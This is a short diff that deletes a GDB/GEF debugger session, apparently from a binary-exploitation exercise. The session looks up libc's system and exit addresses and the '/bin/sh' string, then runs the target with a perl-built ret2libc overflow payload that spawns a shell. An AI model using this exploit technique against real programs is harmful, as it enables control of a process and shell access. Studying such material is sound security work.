@@ -1,8 +1,0 @@
-gef➤  p system
-$1 = {int (const char *)} 0x7ffff7e1a410 <__libc_system>
-gef➤  p exit
-$2 = {void (int)} 0x7ffff7e0ebc0 <__GI_exit>
-gef➤  find &system,+9999999,"/bin/sh" 
-0x7ffff7f7c5aa
-r `perl -e 'print "A"x100, "B"x4, "\x10\xa4\xe1\xf7\xff\x7f", "\xc0\xeb\xe0\xf7\xff\x7f", "\xaa\xc5\xf7\xff\x7f"'
-`
